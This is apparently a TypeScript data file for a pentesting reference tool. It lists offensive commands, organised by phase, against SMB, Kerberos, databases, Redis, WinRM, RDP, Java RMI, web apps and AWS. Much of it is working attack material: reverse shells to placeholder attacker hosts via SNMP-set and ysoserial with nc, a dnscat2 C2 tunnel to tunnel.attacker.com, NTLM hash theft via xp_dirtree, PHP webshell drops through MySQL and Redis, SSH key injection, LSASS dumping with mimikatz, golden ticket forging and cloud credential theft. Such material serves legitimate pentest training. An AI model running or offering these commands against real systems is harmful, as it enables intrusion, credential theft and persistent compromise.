export interface CheatsheetCommand {
  label: string;
  command: string;
  description: string;
}

export interface CheatsheetService {
  id: string;
  title: string;
  port?: number | string;
  protocol: string;
  category: "Active Directory" | "Network Ports" | "Databases" | "Linux" | "Windows" | "Web" | "Cloud";
  summary: string;
  tags?: string[];
  phases: {
    recon: CheatsheetCommand[];
    enumeration: CheatsheetCommand[];
    exploitation: CheatsheetCommand[];
    privesc?: CheatsheetCommand[];
  };
}

export const CHEATSHEETS: CheatsheetService[] = [
  {
    id: "smb-445",
    title: "SMB — Server Message Block",
    port: 445,
    protocol: "TCP 445 / 139",
    category: "Network Ports",
    summary: "Critical network file sharing protocol. Prime vector for anonymous null sessions, SMB signing bypass, and EternalBlue/ZeroLogon/Relay attacks.",
    tags: ["smb", "netexec", "impacket", "ms17-010", "psexec", "null-session"],
    phases: {
      recon: [
        {
          label: "Nmap SMB Discovery",
          command: "nmap -p 139,445 --script smb-os-discovery,smb-security-mode,smb2-security-mode <TARGET>",
          description: "Detect OS version, domain name, NetBIOS name, and SMB signing requirements."
        },
        {
          label: "NetExec SMB Dialect & Signing Probe",
          command: "netexec smb <TARGET> --gen-relay-list smb_relay.txt",
          description: "Quick probe for SMB signing status to identify relay targets (Signing: False)."
        }
      ],
      enumeration: [
        {
          label: "Anonymous Null Session Share Dump",
          command: "netexec smb <TARGET> -u '' -p '' --shares",
          description: "List accessible network shares using unauthenticated null session."
        },
        {
          label: "Guest User Share Enumeration",
          command: "smbclient -N -L //<TARGET>",
          description: "Interactive anonymous SMB client share listing."
        },
        {
          label: "RPC Client User & Group Dump",
          command: "rpcclient -U \"\" -N <TARGET> -c \"enumdomusers; querydispinfo; enumdomgroups\"",
          description: "Dump Active Directory domain usernames and RID cycling via RPC."
        },
        {
          label: "Enum4Linux-ng Full Scan",
          command: "enum4linux-ng -A -R <TARGET>",
          description: "Automated extraction of users, groups, shares, and password policies."
        }
      ],
      exploitation: [
        {
          label: "EternalBlue (MS17-010) Verification",
          command: "nmap -p 445 --script smb-vuln-ms17-010 <TARGET>",
          description: "Check remote code execution vulnerability in SMBv1 kernel driver."
        },
        {
          label: "SMB Hash Relay via Impacket",
          command: "impacket-ntlmrelayx -tf smb_relay.txt -smb2support -socks",
          description: "Intercept and relay NTLM authentication to execute interactive SOCKS proxy."
        },
        {
          label: "PsExec SYSTEM Command Execution",
          command: "impacket-psexec DOMAIN/user:password@<TARGET>",
          description: "Instantiate remote NT AUTHORITY\\SYSTEM service shell over SMB."
        }
      ],
      privesc: [
        {
          label: "WMIExec Semi-Interactive Shell",
          command: "impacket-wmiexec DOMAIN/user:password@<TARGET>",
          description: "Stealthier remote execution via Windows Management Instrumentation (WMI)."
        }
      ]
    }
  },
  {
    id: "active-directory-kerberos",
    title: "Kerberos & Active Directory Authentication",
    port: 88,
    protocol: "TCP/UDP 88",
    category: "Active Directory",
    summary: "Ticket-based domain authentication. Attack vectors include AS-REP Roasting, Kerberoasting, Unconstrained Delegation, and Overpass-the-Hash.",
    tags: ["kerberos", "asreproast", "kerberoast", "kdc", "tgt", "tgs", "golden-ticket"],
    phases: {
      recon: [
        {
          label: "Identify Domain Controller & Kerberos KDC",
          command: "nmap -p 88 --open -sV <TARGET_SUBNET>",
          description: "Locate active Domain Controllers listening on Kerberos KDC port 88."
        }
      ],
      enumeration: [
        {
          label: "AS-REP Roasting (No Pre-Auth Users)",
          command: "impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -format hashcat -outputfile asreproast.hash",
          description: "Query accounts that do not require Kerberos preauthentication to dump offline crackable TGT hashes."
        },
        {
          label: "Kerberoasting (SPN Service Accounts)",
          command: "impacket-GetUserSPNs domain.local/user:password -dc-ip <DC_IP> -request -outputfile kerberoast.hash",
          description: "Request TGS service tickets for service accounts and extract TGS-REP hash for offline cracking."
        }
      ],
      exploitation: [
        {
          label: "Crack Hashes with Hashcat",
          command: "hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt -o cracked.txt",
          description: "Crack Kerberos TGS-REP service ticket hashes (Hashcat mode 13100) or mode 18200 for AS-REP."
        },
        {
          label: "DCSync Domain Credentials Harvest",
          command: "impacket-secretsdump domain.local/admin:password@<DC_IP> -just-dc-ntlm",
          description: "Replicate Active Directory directory partition using DRSUAPI to harvest all domain user NTLM hashes."
        }
      ],
      privesc: [
        {
          label: "Golden Ticket Generation (KRBTGT)",
          command: "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain domain.local Administrator",
          description: "Forge a Golden Ticket granting permanent Domain Admin rights for 10 years."
        }
      ]
    }
  },
  {
    id: "ldap-389",
    title: "LDAP / LDAPS — Directory Services",
    port: 389,
    protocol: "TCP 389 / 636",
    category: "Active Directory",
    summary: "Lightweight Directory Access Protocol. Critical for domain architecture enumeration, ACL discovery, and BloodHound collection.",
    tags: ["ldap", "ldaps", "bloodhound", "windapsearch", "anonymous-bind"],
    phases: {
      recon: [
        {
          label: "LDAP RootDSE Extraction",
          command: "ldapsearch -x -H ldap://<TARGET> -s base namingcontexts",
          description: "Retrieve Active Directory naming context and base domain DN without authentication."
        }
      ],
      enumeration: [
        {
          label: "Anonymous User & Object Query",
          command: "ldapsearch -x -H ldap://<TARGET> -b \"DC=domain,DC=local\" \"(objectClass=user)\" sAMAccountName",
          description: "List all Active Directory users via unauthenticated LDAP bind."
        },
        {
          label: "BloodHound Python Ingestion",
          command: "bloodhound-python -u user -p password -d domain.local -dc dc.domain.local -c All -ns <DC_IP>",
          description: "Collect all users, groups, computers, ACLs, and sessions for graph-based privilege analysis."
        }
      ],
      exploitation: [
        {
          label: "LAPS Password Retrieval via LDAP",
          command: "impacket-GetLAPSPasswords domain.local/user:password -dc-ip <DC_IP>",
          description: "Extract plaintext Local Administrator Password Solution (LAPS) passwords."
        }
      ]
    }
  },
  {
    id: "msrpc-135",
    title: "MSRPC — Microsoft Endpoint Mapper",
    port: 135,
    protocol: "TCP 135",
    category: "Network Ports",
    summary: "Microsoft Remote Procedure Call mapper. Used to discover hidden dynamic RPC interfaces and execute RPC attacks.",
    tags: ["msrpc", "rpcdump", "rpcclient"],
    phases: {
      recon: [
        {
          label: "RPCDump Interface Enumeration",
          command: "impacket-rpcdump -port 135 <TARGET>",
          description: "Query RPC Endpoint Mapper to find listening interfaces (WMI, Task Scheduler, Print Spooler)."
        }
      ],
      enumeration: [
        {
          label: "RPCClient Null-Session Enumeration",
          command: "rpcclient -U \"\" -N <TARGET>",
          description: "Interactive session commands: enumdomusers, enumdomgroups, getdompwinfo, queryuser <RID>."
        }
      ],
      exploitation: [
        {
          label: "PetitPotam (MS-EFSRPC) Coercion",
          command: "python3 PetitPotam.py <ATTACKER_IP> <TARGET_DC>",
          description: "Coerce domain controller machine account NTLM authentication to relay target."
        }
      ]
    }
  },
  {
    id: "dns-53",
    title: "DNS — Domain Name System",
    port: 53,
    protocol: "TCP/UDP 53",
    category: "Network Ports",
    summary: "Internal and external name resolution. Key vectors: Zone transfers (AXFR), Active Directory service locator records, and DNS exfiltration.",
    tags: ["dns", "axfr", "dig", "zone-transfer"],
    phases: {
      recon: [
        {
          label: "Full DNS Zone Transfer (AXFR)",
          command: "dig axfr @<TARGET> domain.local",
          description: "Attempt full DNS zone dump to expose all internal hosts and IP addresses."
        }
      ],
      enumeration: [
        {
          label: "Enumerate Active Directory SRV Records",
          command: "dig _ldap._tcp.dc._msdcs.domain.local @<TARGET> SRV",
          description: "Discover all Domain Controllers, Kerberos KDC, and LDAP endpoints."
        }
      ],
      exploitation: [
        {
          label: "DNS Tunneling Exfiltration (dnscat2)",
          command: "dnscat2-client --dns domain=tunnel.attacker.com",
          description: "Establish stealthy encrypted C2 tunnel traversing strict firewall policies."
        }
      ]
    }
  },
  {
    id: "snmp-161",
    title: "SNMP — Simple Network Management",
    port: 161,
    protocol: "UDP 161 / 162",
    category: "Network Ports",
    summary: "Network infrastructure monitoring. Exposes running processes, system users, network interfaces, and device configurations.",
    tags: ["snmp", "onesixtyone", "snmpwalk", "community-strings"],
    phases: {
      recon: [
        {
          label: "SNMP Community String Brute Force",
          command: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <TARGET>",
          description: "High-speed probe for public, private, and custom community strings."
        }
      ],
      enumeration: [
        {
          label: "Full MIB Tree Walk",
          command: "snmpwalk -v2c -c public <TARGET>",
          description: "Dump system description, interface stats, and storage info."
        },
        {
          label: "Enumerate Running Processes via SNMP",
          command: "snmpwalk -v2c -c public <TARGET> 1.3.6.1.2.1.25.4.2.1.2",
          description: "List active process names and system binaries executed on target."
        }
      ],
      exploitation: [
        {
          label: "SNMP Writable Config Injection (SNMP-Set)",
          command: "snmpset -v2c -c private <TARGET> 1.3.6.1.4.1.2021.10.1.3.1 s \"/bin/bash -i >& /dev/tcp/<IP>/4444 0>&1\"",
          description: "Execute arbitrary commands when SNMP write permissions are enabled."
        }
      ]
    }
  },
  {
    id: "mssql-1433",
    title: "MSSQL — Microsoft SQL Server",
    port: 1433,
    protocol: "TCP 1433",
    category: "Databases",
    summary: "Enterprise relational database. Key vectors: sa password brute-force, xp_cmdshell command execution, linked database traversal, and hash stealing.",
    tags: ["mssql", "sql", "xp_cmdshell", "netexec", "impacket"],
    phases: {
      recon: [
        {
          label: "MSSQL Ping & Instance Enumeration",
          command: "netexec mssql <TARGET> -u '' -p ''",
          description: "Query MSSQL browser service for instance name, version, and auth mode."
        }
      ],
      enumeration: [
        {
          label: "Impacket MSSQLClient Interactive Shell",
          command: "impacket-mssqlclient DOMAIN/user:password@<TARGET> -windows-auth",
          description: "Connect to database and inspect server configuration, databases, and privileges."
        }
      ],
      exploitation: [
        {
          label: "Enable & Execute xp_cmdshell (RCE)",
          command: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
          description: "Spawn operating system command shell under MSSQL service account context."
        },
        {
          label: "Steal NetNTLMv2 Hash via xp_dirtree",
          command: "EXEC master..xp_dirtree '\\\\<ATTACKER_IP>\\share';",
          description: "Force MSSQL server to authenticate to SMB listener and capture hash with Responder."
        }
      ]
    }
  },
  {
    id: "mysql-3306",
    title: "MySQL / MariaDB Database",
    port: 3306,
    protocol: "TCP 3306",
    category: "Databases",
    summary: "Pervasive database engine. Vectors: Default root credentials, UDF dynamic library injection for RCE, and local file read/write.",
    tags: ["mysql", "mariadb", "udf", "into-outfile"],
    phases: {
      recon: [
        {
          label: "Banner & Auth Protocol Check",
          command: "nmap -p 3306 --script mysql-info,mysql-enum <TARGET>",
          description: "Inspect MySQL server version and authentication plugins."
        }
      ],
      enumeration: [
        {
          label: "Local File Extraction via LOAD_FILE",
          command: "SELECT LOAD_FILE('/etc/passwd');",
          description: "Read sensitive files from server filesystem when file privilege is granted."
        }
      ],
      exploitation: [
        {
          label: "Webshell Drop via INTO OUTFILE",
          command: "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
          description: "Write PHP webshell directly into web server document root."
        }
      ]
    }
  },
  {
    id: "postgresql-5432",
    title: "PostgreSQL Database Server",
    port: 5432,
    protocol: "TCP 5432",
    category: "Databases",
    summary: "Advanced relational database. Vectors: COPY ... FROM PROGRAM command execution, large object DLL hijacking, and superuser privilege abuse.",
    tags: ["postgresql", "postgres", "copy-program", "cve-2019-9193"],
    phases: {
      recon: [
        {
          label: "Nmap PostgreSQL Fingerprint",
          command: "nmap -p 5432 -sV --script pgsql-databases <TARGET>",
          description: "Check PostgreSQL port and database list."
        }
      ],
      enumeration: [
        {
          label: "CLI Database Connection",
          command: "psql -h <TARGET> -U postgres -d postgres",
          description: "Interactive psql connection to query schema and tables."
        }
      ],
      exploitation: [
        {
          label: "COPY FROM PROGRAM (RCE)",
          command: "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami && id'; SELECT * FROM cmd_exec;",
          description: "Execute operating system commands under postgres user context."
        }
      ]
    }
  },
  {
    id: "redis-6379",
    title: "Redis In-Memory Key-Value Store",
    port: 6379,
    protocol: "TCP 6379",
    category: "Databases",
    summary: "High-speed cache and database. Frequently unauthenticated. Key vectors: writing SSH authorized_keys to root, cron job injection, and webshell drops.",
    tags: ["redis", "unauthenticated", "authorized_keys", "cron-rce"],
    phases: {
      recon: [
        {
          label: "Probe Unauthenticated Redis Access",
          command: "redis-cli -h <TARGET> info",
          description: "Test if Redis server requires authentication and extract server statistics."
        }
      ],
      enumeration: [
        {
          label: "Dump All Keys and Configuration",
          command: "redis-cli -h <TARGET> keys *; redis-cli -h <TARGET> config get dir",
          description: "List cached data, tokens, and active working directory."
        }
      ],
      exploitation: [
        {
          label: "SSH Key Overwrite for Root Access",
          command: "(echo -e \"\\n\\n\"; cat ~/.ssh/id_rsa.pub; echo -e \"\\n\\n\") > /tmp/key.txt && redis-cli -h <TARGET> -x set ssh_key < /tmp/key.txt && redis-cli -h <TARGET> config set dir /root/.ssh && redis-cli -h <TARGET> config set dbfilename authorized_keys && redis-cli -h <TARGET> save",
          description: "Write attacker SSH public key directly into /root/.ssh/authorized_keys."
        },
        {
          label: "Webshell Injection via Redis",
          command: "redis-cli -h <TARGET> config set dir /var/www/html && redis-cli -h <TARGET> config set dbfilename shell.php && redis-cli -h <TARGET> set test \"<?php system($_GET['cmd']); ?>\" && redis-cli -h <TARGET> save",
          description: "Drop PHP webshell into web root directory."
        }
      ]
    }
  },
  {
    id: "winrm-5985",
    title: "WinRM — Windows Remote Management",
    port: 5985,
    protocol: "TCP 5985 / 5986",
    category: "Windows",
    summary: "SOAP-based Windows remote administration protocol. Prime target for credential attacks, pass-the-hash, and full interactive PowerShell access.",
    tags: ["winrm", "evil-winrm", "powershell-remoting"],
    phases: {
      recon: [
        {
          label: "Nmap WinRM Discovery",
          command: "nmap -p 5985,5986 -sV --script wsman <TARGET>",
          description: "Detect WinRM service and WS-Management API capabilities."
        }
      ],
      enumeration: [
        {
          label: "NetExec WinRM Credential Validation",
          command: "netexec winrm <TARGET> -u users.txt -p passwords.txt",
          description: "Spray credentials to check Remote Management Users or Administrators rights."
        }
      ],
      exploitation: [
        {
          label: "Evil-WinRM Interactive Shell",
          command: "evil-winrm -i <TARGET> -u username -p password",
          description: "Launch interactive PowerShell console with automated script execution and file transfer."
        },
        {
          label: "Evil-WinRM Pass-the-Hash Execution",
          command: "evil-winrm -i <TARGET> -u Administrator -H <NTLM_HASH>",
          description: "Authenticate directly with NTLM hash without cracking plaintext password."
        }
      ]
    }
  },
  {
    id: "rdp-3389",
    title: "RDP — Remote Desktop Protocol",
    port: 3389,
    protocol: "TCP 3389",
    category: "Windows",
    summary: "Graphical remote desktop interface. Vectors: BlueKeep (CVE-2019-0708), NLA bypass, session hijacking, and sticky keys persistence.",
    tags: ["rdp", "xfreerdp", "bluekeep", "session-hijacking"],
    phases: {
      recon: [
        {
          label: "Check NLA & Encryption Protocol",
          command: "nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <TARGET>",
          description: "Extract NetBIOS computer name, domain name, and Network Level Authentication status."
        }
      ],
      enumeration: [
        {
          label: "BlueKeep Vulnerability Check (CVE-2019-0708)",
          command: "nmap -p 3389 --script rdp-vuln-ms12-020,rdp-vuln-bluekeep <TARGET>",
          description: "Probe unauthenticated kernel memory corruption in legacy RDP stacks."
        }
      ],
      exploitation: [
        {
          label: "xfreerdp Remote Connection",
          command: "xfreerdp /v:<TARGET> /u:username /p:password /cert-ignore +clipboard",
          description: "Connect to graphical desktop session with bi-directional clipboard sharing."
        },
        {
          label: "Pass-the-Hash RDP Access (Restricted Admin)",
          command: "xfreerdp /v:<TARGET> /u:Administrator /pth:<NTLM_HASH> /cert-ignore",
          description: "Log into RDP desktop using NTLM hash via Restricted Admin Mode."
        }
      ]
    }
  },
  {
    id: "nfs-2049",
    title: "NFS — Network File System",
    port: 2049,
    protocol: "TCP 2049 / 111",
    category: "Network Ports",
    summary: "Unix distributed filesystem. Vectors: unauthenticated export mounts, sensitive file leaks, and root squashing bypass (no_root_squash) for local root.",
    tags: ["nfs", "showmount", "no_root_squash"],
    phases: {
      recon: [
        {
          label: "Showmount Exported Shares",
          command: "showmount -e <TARGET>",
          description: "List exported network directory paths and client CIDR permissions."
        }
      ],
      enumeration: [
        {
          label: "Mount NFS Share Locally",
          command: "mkdir -p /mnt/target_nfs && mount -t nfs -o nolock <TARGET>:/export_path /mnt/target_nfs",
          description: "Mount remote directory into local filesystem."
        }
      ],
      exploitation: [
        {
          label: "SUID Root Binary Injection (no_root_squash)",
          command: "cp /bin/bash /mnt/target_nfs/rootbash && chmod +s /mnt/target_nfs/rootbash",
          description: "When no_root_squash is active, create an SUID root binary on the mounted share, then execute on target for instant root!"
        }
      ]
    }
  },
  {
    id: "oracle-1521",
    title: "Oracle TNS Listener",
    port: 1521,
    protocol: "TCP 1521",
    category: "Databases",
    summary: "Oracle database network listener. Vectors: SID brute-force, ODMS exploit, Java stored procedures, and OS command execution via DBMS_SCHEDULER.",
    tags: ["oracle", "tns", "odat", "sid-guesser"],
    phases: {
      recon: [
        {
          label: "SID Guessing & TNS Version Check",
          command: "odat sidguesser -s <TARGET> -p 1521",
          description: "Identify valid System Identifiers (SIDs) using automated wordlists."
        }
      ],
      enumeration: [
        {
          label: "ODAT Password Guesser",
          command: "odat passwordguesser -s <TARGET> -d <SID> -p 1521 --both-usr-pwd",
          description: "Enumerate common default Oracle administrative accounts (SYS, SYSTEM, SCOTT)."
        }
      ],
      exploitation: [
        {
          label: "Execute Operating System Commands via ODAT",
          command: "odat utlfile -s <TARGET> -d <SID> -U scott -P tiger -p 1521 --exec /bin/bash \"whoami\"",
          description: "Execute arbitrary OS commands using Oracle DBMS packages or Java stored procedures."
        }
      ]
    }
  },
  {
    id: "java-rmi-1099",
    title: "Java RMI / JMX Registry",
    port: 1099,
    protocol: "TCP 1099",
    category: "Network Ports",
    summary: "Remote Method Invocation and JMX management console. High-risk vector for unauthenticated deserialization and MBean command injection.",
    tags: ["java", "rmi", "jmx", "ysoserial", "mjet"],
    phases: {
      recon: [
        {
          label: "Nmap JMX / RMI Dump",
          command: "nmap -p 1099 --script rmi-dumpregistry,rmi-vuln-classloader <TARGET>",
          description: "Extract bound Java class names and remote object references."
        }
      ],
      enumeration: [
        {
          label: "JMX Authentication & MBean Probe",
          command: "java -jar sjet.jar <TARGET> 1099",
          description: "Verify if JMX endpoint permits unauthenticated MBean registration."
        }
      ],
      exploitation: [
        {
          label: "YSOSERIAL Java Deserialization Attack",
          command: "java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <TARGET> 1099 CommonsCollections6 \"nc <IP> 4444 -e /bin/sh\"",
          description: "Execute payload against Java RMI registry using deserialization gadget chains."
        }
      ]
    }
  },
  {
    id: "linux-privesc",
    title: "Linux Privilege Escalation Vectors",
    protocol: "Local OS",
    category: "Linux",
    summary: "Systematic local enumeration, SUID root exploitation, sudoers misconfigurations, kernel exploits, and cron task hijackings.",
    tags: ["linux", "privesc", "suid", "sudo", "gtfobins", "pspy"],
    phases: {
      recon: [
        {
          label: "Kernel & Architecture Triage",
          command: "uname -a; cat /etc/os-release; id; whoami",
          description: "Display Linux kernel build, distribution release, and effective UID/GID context."
        },
        {
          label: "Audit Sudo Permissions",
          command: "sudo -l",
          description: "Inspect active sudo policies for NOPASSWD binary entries on GTFOBins."
        }
      ],
      enumeration: [
        {
          label: "Search SUID & SGID Binaries",
          command: "find / -perm -u=s -type f 2>/dev/null",
          description: "Locate executables set to run under root privileges."
        },
        {
          label: "Monitor Background Cron Tasks (Pspy)",
          command: "./pspy64 -pf -i 1000",
          description: "Snoop on cron jobs and root daemon execution in real time without root permissions."
        },
        {
          label: "Audit Linux Capabilities",
          command: "getcap -r / 2>/dev/null",
          description: "Search for binaries configured with cap_setuid, cap_dac_override, or cap_net_raw."
        }
      ],
      exploitation: [
        {
          label: "GTFOBins Sudo NOPASSWD Escape",
          command: "sudo /usr/bin/find . -exec /bin/sh \\; -quit",
          description: "Break out into interactive root shell using find binary."
        },
        {
          label: "Shared Object (SO) Hijacking",
          command: "strace -f -e openat,access /usr/local/bin/custom_binary 2>&1 | grep -E \"\\.so.*NOENT\"",
          description: "Detect missing shared library dependencies loaded from writable directory."
        }
      ],
      privesc: [
        {
          label: "Docker Socket Root Breakout",
          command: "docker run -v /:/host -it alpine chroot /host /bin/bash",
          description: "Mount the host root filesystem inside an unconfined container."
        }
      ]
    }
  },
  {
    id: "windows-privesc",
    title: "Windows Privilege Escalation & Tokens",
    protocol: "Local OS",
    category: "Windows",
    summary: "Privilege escalation through SeImpersonatePrivilege, Juicy/Print/God Potato, unquoted service paths, and credential harvesting.",
    tags: ["windows", "privesc", "potato", "godpotato", "seimpersonate", "mimikatz"],
    phases: {
      recon: [
        {
          label: "User Context & Privileges",
          command: "whoami /priv; whoami /groups; net user %USERNAME%",
          description: "Verify active user privileges (check for SeImpersonatePrivilege or SeDebugPrivilege)."
        }
      ],
      enumeration: [
        {
          label: "Unquoted Service Path Scan",
          command: "wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\"",
          description: "Locate services whose execution path contains spaces and lacks enclosing quotes."
        },
        {
          label: "AlwaysInstallElevated Registry Check",
          command: "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
          description: "Check if non-administrators can install MSI packages with SYSTEM privileges."
        }
      ],
      exploitation: [
        {
          label: "GodPotato (SeImpersonate Abuse)",
          command: "GodPotato.exe -cmd \"cmd.exe /c whoami\"",
          description: "Abuse SeImpersonatePrivilege on Windows 10/11 & Server 2019/2022 to spawn SYSTEM."
        },
        {
          label: "Dump LSASS Memory via ProcDump",
          command: "procdump.exe -ma lsass.exe lsass.dmp",
          description: "Memory dump LSASS process to extract cleartext passwords and NTLM hashes offline."
        }
      ],
      privesc: [
        {
          label: "Extract Hashes via Mimikatz",
          command: "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit",
          description: "Extract logon passwords from offline LSASS dump."
        }
      ]
    }
  },
  {
    id: "web-exploitation",
    title: "Web Security & Injection Vectors",
    port: 80,
    protocol: "HTTP / HTTPS (80, 443)",
    category: "Web",
    summary: "Modern web vulnerability exploitation: Blind SQLi, Server-Side Request Forgery (SSRF), JWT vulnerabilities, and Command Injection.",
    tags: ["web", "sqli", "ssrf", "jwt", "ffuf", "xss"],
    phases: {
      recon: [
        {
          label: "Web Technology Stack Fingerprinting",
          command: "whatweb -a 3 http://<TARGET>",
          description: "Determine CMS, programming language, server headers, and cookie attributes."
        }
      ],
      enumeration: [
        {
          label: "Directory & VHost Fuzzing via Ffuf",
          command: "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<TARGET>/FUZZ -mc 200,301,302,403",
          description: "High-speed HTTP endpoint and secret file discovery."
        },
        {
          label: "SQLMap Automated Exploitation",
          command: "sqlmap -u \"http://<TARGET>/api/item?id=1\" --batch --dbs --risk=3 --level=3",
          description: "Automated injection verification and database schema extraction."
        }
      ],
      exploitation: [
        {
          label: "SSRF AWS IMDSv2 Token & Credential Steal",
          command: "TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\") && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          description: "Bypass AWS IMDSv2 metadata protection using SSRF to harvest IAM role STS tokens."
        },
        {
          label: "JWT None Algorithm Confusion",
          command: "python3 -c \"import jwt; print(jwt.encode({'user': 'admin', 'role': 'ADMIN'}, '', algorithm='none'))\"",
          description: "Forge unauthorized administrative tokens by setting the algorithm header to none."
        }
      ]
    }
  },
  {
    id: "aws-cloud-security",
    title: "AWS Cloud & Cognito Infrastructure",
    protocol: "Cloud HTTPS",
    category: "Cloud",
    summary: "Cloud assessment methodology targeting AWS Cognito identity pools, unauthenticated IAM roles, S3 bucket misconfigurations, and Lambda privilege escalation.",
    tags: ["cloud", "aws", "cognito", "s3", "iam", "pacu"],
    phases: {
      recon: [
        {
          label: "Enumerate S3 Bucket Permissions",
          command: "aws s3 ls s3://<BUCKET_NAME> --no-sign-request",
          description: "Test if target cloud object storage permits public read or anonymous list operations."
        }
      ],
      enumeration: [
        {
          label: "AWS Cognito Unauthenticated Identity Extraction",
          command: "aws cognito-identity get-id --identity-pool-id <POOL_ID> --no-sign-request",
          description: "Obtain an unauthenticated IdentityId from a public Cognito Identity Pool."
        },
        {
          label: "Obtain Temporary STS Credentials",
          command: "aws cognito-identity get-credentials-for-identity --identity-id <IDENTITY_ID> --no-sign-request",
          description: "Exchange the IdentityId for real AccessKeyId, SecretKey, and SessionToken."
        }
      ],
      exploitation: [
        {
          label: "Enumerate IAM Privileges (Pacu)",
          command: "pacu --session audit_session",
          description: "Automated AWS exploitation framework to identify privilege escalation paths."
        }
      ]
    }
  }
];
